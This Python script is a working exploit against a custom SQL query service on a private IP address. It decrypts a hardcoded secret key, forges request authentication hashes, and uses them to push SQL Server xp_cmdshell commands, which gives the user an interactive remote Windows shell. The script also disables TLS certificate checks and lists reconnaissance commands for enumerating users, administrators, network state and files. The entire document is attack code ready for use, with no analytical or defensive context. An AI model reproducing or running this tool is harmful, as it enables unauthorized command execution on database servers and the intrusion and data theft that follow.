#!/usr/bin/env python3
import socket, ssl, hashlib, base64, re, readline
from cryptography.hazmat.primitives.ciphers import Cipher, algorithms, modes

HOST           = "10.6.19.185"
PORT           = 5757
TIMEOUT        = 8
FIXED_FILENAME = "SqlFileDynamic.sql"
KEY_STATIC     = "a3(D3$@fK3"
ENCRYPTED_SK   = "USJJ2ecM0/T8zLBzfsOec7KB1jIBUXcypIfvedawppk="
USE_TLS        = True

def decrypt_secret_key(enc_b64, key_static):
    aes_key = key_static.ljust(24).encode("utf-8")
    enc     = base64.b64decode(enc_b64)
    dec     = Cipher(algorithms.AES(aes_key), modes.ECB()).decryptor()
    raw     = dec.update(enc) + dec.finalize()
    return raw[:-raw[-1]].decode("utf-8")

REAL_SECRET_KEY = decrypt_secret_key(ENCRYPTED_SK, KEY_STATIC)

def forge_hash(sql):
    data = sql + REAL_SECRET_KEY + FIXED_FILENAME
    return hashlib.sha256(data.encode("utf-8")).hexdigest().upper()

def send_raw(payload, timeout=TIMEOUT):
    try:
        raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        raw_sock.settimeout(timeout)
        raw_sock.connect((HOST, PORT))
        
        if USE_TLS:
            ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            s = ctx.wrap_socket(raw_sock, server_hostname=HOST)
        else:
            s = raw_sock
        
        s.sendall(payload.encode("utf-8"))
        resp = b""
        while True:
            try:
                chunk = s.recv(4096)
                if not chunk:
                    break
                resp += chunk
            except socket.timeout:
                break
        s.close()
        return resp.decode(errors="replace").strip()
    except Exception as e:
        return f"CONN_ERROR: {e}"

def fmt(resp):
    if not resp:
        return "(empty)"
    rows = resp.split(";")
    return "\n".join(r.replace("~", "  |  ") for r in rows if r.strip())

def os_cmd(cmd):
    cmd = re.sub(r'([A-Za-z]):', r'%SYSTEMDRIVE%', cmd, count=1)
    sql     = f"EXEC xp_cmdshell '{cmd}'"
    h       = forge_hash(sql)
    payload = f"QUERY-DATA::SQLSERVER:{sql}:{h}:admin"
    return send_raw(payload)

HISTORY_FILE = ".qbtk_history"
try:
    readline.read_history_file(HISTORY_FILE)
except FileNotFoundError:
    pass
readline.set_history_length(500)

def save_history():
    readline.write_history_file(HISTORY_FILE)

def interactive_shell():
    print(f"\n\033[1;32m[*] Connected  : {HOST}:{PORT} (TLS={USE_TLS})")
    print(f"[*] SecretKey  : {REAL_SECRET_KEY}")
    print(f"[*] sysadmin   : YES\033[0m")
    print("\nType a command, \033[1;33mhelp\033[0m, or \033[1;31mexit\033[0m\n")

    while True:
        try:
            line = input("\033[1;36mshell\033[0m \033[1;37m>\033[0m ").strip()
        except (KeyboardInterrupt, EOFError):
            print("\n[*] Exiting.")
            save_history()
            break

        if not line:
            continue

        if line != readline.get_history_item(readline.get_current_history_length()):
            readline.add_history(line)
        save_history()

        if line.lower() in ("exit", "quit"):
            print("[*] Bye.")
            save_history()
            break

        elif line.lower() in ("help", "?"):
            print("""
\033[1;33mCommands:\033[0m
  whoami /all
  hostname
  net user
  net localgroup administrators
  ipconfig
  tasklist
  netstat -an
  dir c:\\
  type c:\\path\\to\\file.txt
  powershell Get-ChildItem $env:SystemDrive\\

\033[1;33mHistory:\033[0m
  ↑ ↓         browse previous commands
  history     show command history

\033[1;31mNote:\033[0m C:\\ auto-converted to %SYSTEMDRIVE%\\ internally
""")

        elif line.lower() == "history":
            total = readline.get_current_history_length()
            for i in range(1, total + 1):
                print(f"  {i:>3}  {readline.get_history_item(i)}")

        else:
            resp = os_cmd(line)
            if "ERROR=" in resp or "CONN_ERROR" in resp:
                print(f"\033[1;31m[ERR]\033[0m {resp}")
            else:
                print(f"\033[1;32m[OK]\033[0m\n{fmt(resp)}")

if __name__ == "__main__":
    import sys
    if "--no-tls" in sys.argv:
        USE_TLS = False
    interactive_shell()
